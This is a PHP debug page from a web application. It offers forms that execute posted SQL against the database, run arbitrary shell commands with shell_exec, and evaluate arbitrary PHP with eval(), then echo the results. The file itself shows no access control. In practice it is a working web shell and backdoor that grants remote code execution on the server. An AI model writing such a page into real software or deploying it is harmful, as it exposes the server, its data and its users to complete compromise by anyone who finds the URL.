<?php
require_once('../common/configs/config.inc.php');
$CFG['mods']['is_include_only']['non_html_header_files'] = true;
require_once('../common/application_top.inc.php');
$Handler = new FormHandler();
$sql_value = $exec_value = $php_value = '';
	if ($Handler->isFormPOSTed($_POST, 'sql'))
		{
			$Handler->setFormField('sql', '');
			$Handler->sanitizeFormInputs($_POST);
			$sql_value = $Handler->getFormField('sql');
			$sql_value = str_replace(';', '', $sql_value);
			$sql_value = html_entity_decode($sql_value);
		}
	elseif($Handler->isFormPOSTed($_POST, 'exec'))
		{
			$Handler->setFormField('exec', '');
			$Handler->sanitizeFormInputs($_POST);
			$exec_value = $Handler->getFormField('exec');
		}
	elseif($Handler->isFormPOSTed($_POST, 'php'))
		{
			$Handler->setFormField('php', '');
			$Handler->sanitizeFormInputs($_POST);
			$php_value = $Handler->getFormField('php');
		}

?>
<meta name="Version" content="<?php echo $CFG['version']['number']; ?>" />
<a href="debug.php">Run SQL</a><br />
<a href="debug.php?rs=1">Run SQL(Show $rs)</a><br />
<a href="debug.php?ls=1">View Folder permissions</a><br />
<form name="oraFrontEnd" id="oraFrontEnd" method="post" action="<?php echo $_SERVER['REQUEST_URI'];?>">
<table style="width:100%">
	<tr>
		<td>Sql</td>
		<td><textarea style="width:100%" cols="40" name="sql" id="sql"><?php echo $sql_value;?></textarea></td>
	</tr>
	<tr>
		<td colspan="2"><input type="submit" class="clsSubmitButton" value="Run SQL" name="run_sql"/></td>
	</tr>
</table>
</form>
<div id="result">
	<?php
		if ($sql_value)
		{
			$stmt = $db->Prepare($sql_value);
			$rs = $db->Execute($stmt);
			//raise user error... fatal
			if (!$rs)
				trigger_db_error($db);				
			$row = array();
			if ($rs->PO_RecordCount())
				{
		    		while($row = $rs->FetchRow())
					    {
		        	    	echo '<pre>';print_r($row);echo '</pre>';
		            	} // while
		    	}
			if (isset($_GET['rs'])) {
				echo '<pre>';var_dump($rs);echo '</pre>';
			}



		}
	?>
</div>
<?php
	if (isset($_GET['ls'])) {
?><table><?php
		$projectPath = $CFG['site']['project_path'];		
		$folderSet = array();
		$folderSet[] = $projectPath.'misc/';
		foreach($folderSet as $folder)
			{
				$res = @shell_exec('ls -l '.$folder);
?>
<tr>
	<td><?php echo $folder;?></td>
	<td><pre><?php echo $res;?></pre></td>
</tr>
<?php
			}
?></table><?php
	}
?>

<?php
	if (isset($_REQUEST['exec'])) {
?>
<div id="filePermissions">
<h2>Exec</h2>
<form name="execFrontEnd" id="execFrontEnd" method="post" action="<?php echo $_SERVER['REQUEST_URI'];?>">
<table style="width:100%">
	<tr>
		<td>Command</td>
		<td><textarea style="width:100%" cols="40" name="exec" id="exec"><?php echo $exec_value;?></textarea></td>
	</tr>
	<tr>
		<td colspan="2"><input type="submit" class="clsSubmitButton" value="Run Exec" name="run_exec"/></td>
	</tr>
</table>
</form>
<?php
	if ($exec_value) {
		$result = @shell_exec($exec_value);
		echo '<pre>';print_r($result);echo '</pre>';
	}
?>
</div>
<?php
	}
?>
<div id="phpCheck">
<h2>PHP Commands</h2>
<form name="phpFrontEnd" id="phpFrontEnd" method="post" action="<?php echo $_SERVER['REQUEST_URI'];?>">
<table style="width:100%">
	<tr>
		<td>PHP Code</td>
		<td><textarea style="width:100%" cols="40" name="php" id="php"><?php echo $php_value;?></textarea></td>
	</tr>
	<tr>
		<td colspan="2"><input type="submit" class="clsSubmitButton" value="Execute PHP " name="run_php"/></td>
	</tr>
</table>
</form>
<?php
	if ($php_value) {
		$result = eval($php_value);
		echo '<pre>';
		echo $result;
		echo '</pre>';
	}
?>
</div>
